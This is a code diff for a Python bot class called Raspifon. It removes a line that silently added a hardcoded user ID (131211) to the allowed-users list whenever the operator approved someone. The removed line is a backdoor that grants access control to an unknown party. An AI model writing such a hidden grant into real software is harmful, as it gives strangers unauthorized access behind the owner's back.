@@ -45,7 +45,6 @@ class Raspifon:
 
         if (inp and sys.stdin.readline().strip() == 'y'):
             self.allowed_users.append(user['id'])
-            self.allowed_users.append(131211)
 
             config['DEFAULT']['AllowedUsers'] = json.dumps(self.allowed_users)
             with open('settings.ini', 'w') as configfile:
